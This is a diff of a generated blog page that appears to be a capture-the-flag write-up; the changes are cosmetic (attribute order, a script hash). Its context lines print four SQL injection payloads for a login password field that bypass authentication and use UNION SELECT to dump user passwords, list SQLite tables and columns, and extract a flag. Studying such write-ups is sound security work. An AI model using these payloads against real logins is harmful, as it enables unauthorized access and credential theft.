@@ -66,7 +66,6 @@ email: user@gmail.com password: password&#39; OR &#39;1&#39;=&#39;1&#39; UNION S
 
 
 
-
     <meta property="article:published_time" content="2023-09-15 20:48:53 &#43;0200 CEST" />
 
 
@@ -146,16 +145,16 @@ email: user@gmail.com password: password&#39; OR &#39;1&#39;=&#39;1&#39; UNION S
 </blockquote>
 <pre tabindex="0"><code>email: user@gmail.com
 password: password&#39; OR &#39;1&#39;=&#39;1&#39; UNION SELECT password,email FROM &#39;users&#39;;--
-</code></pre><p><img src="/images/sqli1.png" alt="Screenshot from 2023-09-16 15-07-53.png"></p>
+</code></pre><p><img alt="Screenshot from 2023-09-16 15-07-53.png" src="/images/sqli1.png"></p>
 <pre tabindex="0"><code>email: user@gmail.com
 password: password&#39; OR &#39;1&#39;=&#39;1&#39; UNION SELECT name,null FROM sqlite_schema;--
-</code></pre><p><img src="/images/sqli2.png" alt="Screenshot from 2023-09-16 15-08-22.png"></p>
+</code></pre><p><img alt="Screenshot from 2023-09-16 15-08-22.png" src="/images/sqli2.png"></p>
 <pre tabindex="0"><code>email: user@gmail.com
 password: password&#39; OR &#39;1&#39;=&#39;1&#39; UNION SELECT name,NULL FROM PRAGMA_TABLE_INFO(&#34;table_that_definitely_does_not_contain_the_flag&#34;);--
-</code></pre><p><img src="/images/sqli3.png" alt="Screenshot from 2023-09-16 15-09-31.png"></p>
+</code></pre><p><img alt="Screenshot from 2023-09-16 15-09-31.png" src="/images/sqli3.png"></p>
 <pre tabindex="0"><code>email: user@gmail.com
 password: password&#39; OR &#39;1&#39;=&#39;1&#39; UNION SELECT NULL,flag_8488bf4d FROM table_that_definitely_does_not_contain_the_flag;--
-</code></pre><p><img src="sqli4.png" alt="Screenshot from 2023-09-16 15-09-58.png"></p>
+</code></pre><p><img alt="Screenshot from 2023-09-16 15-09-58.png" src="sqli4.png"></p>
 
             </div>
         </article>
@@ -183,7 +182,7 @@ password: password&#39; OR &#39;1&#39;=&#39;1&#39; UNION SELECT NULL,flag_8488bf
 
 
 
-<script type="text/javascript" src="/bundle.min.46e438bd2eca7eb6358c700b40f6f56b22ab0b92503ecc11a2d8e4bcc610b8b4da83e5ea3d3e84fdb5f3c3c765744b9f5bbaf43cf5a027910be07ee39a9c12a1.js" integrity="sha512-RuQ4vS7KfrY1jHALQPb1ayKrC5JQPswRotjkvMYQuLTag&#43;XqPT6E/bXzw8dldEufW7r0PPWgJ5EL4H7jmpwSoQ=="></script>
+<script type="text/javascript" src="/bundle.min.85fad2de4f13fec3bcb3b3cb10430cdb44a7b4a9749b32938241a5c6e77718df7624f1002b880521fdc26e24ec1077fda214bf1cb36ee3045510760d09638cae.js" integrity="sha512-hfrS3k8T/sO8s7PLEEMM20SntKl0mzKTgkGlxud3GN92JPEAK4gFIf3CbiTsEHf9ohS/HLNu4wRVEHYNCWOMrg=="></script>
 
 
 
